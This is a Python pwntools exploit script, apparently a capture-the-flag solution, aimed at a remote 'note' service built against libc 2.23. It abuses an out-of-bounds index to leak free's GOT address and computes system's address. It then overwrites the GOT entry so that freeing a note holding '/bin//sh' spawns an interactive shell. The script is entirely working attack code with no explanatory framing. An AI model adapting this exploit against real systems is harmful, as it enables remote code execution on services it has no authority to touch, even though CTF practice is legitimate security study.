#!/usr/bin/env python3

from pwn import *
from pwnlib.gdb import *
from binascii import *
from pwnlib.util.packing import u64, p64, u32, p32
from time import sleep

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.bits = 64

binary = ELF('./bin/note')
libc = ELF('./bin/libc-2.23.so')

# p = process('./bin/note')
p = remote('111.186.57.85', 30016)
# gdb.attach(p)
p.recvuntil('Choice:\n')

# manually executes free once, to fill in GOT entry
p.sendline('1')
p.recvuntil('Index:\n')
p.sendline('1')
p.recvuntil('Size:\n')
p.sendline('8')
p.recvuntil('Choice:\n')

p.sendline('2')
p.recvuntil('Index:\n')
p.sendline('1')
p.recvuntil('Choice:\n')


p.sendline('1')
p.recvuntil('Index:\n')
p.sendline('1')
p.recvuntil('Size:\n')
p.sendline('8')
p.recvuntil('Choice:\n')


p.sendline('3')
p.recvuntil('Index:\n')
p.sendline('1')
p.recvuntil('Len:\n')
p.sendline('8')
p.recvuntil('Input:\n')
p.send('/bin//sh')
p.recvuntil('Choice:\n')


# input()


flipper = 0x400000 + 0x4c0

# got_addr = binary.got['free']
# print('target:', got_addr)


ptrs_addr = binary.symbols['ptrs']
p.sendline('4')
p.recvuntil('Index:\n')
p.sendline(str((flipper - ptrs_addr) // 8))

base_addr = p.recvline(keepends=False, timeout=10)[:7]
print("raw received exploit:", base_addr)
toks = []
for byt in base_addr[::-1]:
    toks.append(hex(byt)[2:].rjust(2, '0'))

free_addr = int(''.join(toks), base=16)

print(toks)
print("free_addr =", hex(free_addr))

system_addr = libc.symbols['system'] - libc.symbols['free'] + free_addr


p.sendline('3')
p.recvuntil('Index:\n')
p.sendline(str((flipper - ptrs_addr) // 8))
p.recvuntil('Len:\n')
p.sendline('8')
p.recvuntil('Input:\n')
p.send(p64(system_addr))
p.recvuntil('Choice:\n')

# now we've hooked free => system.
# let's get shell!
p.sendline('2')
p.recvuntil('Index:\n')
p.sendline('1')

p.interactive()
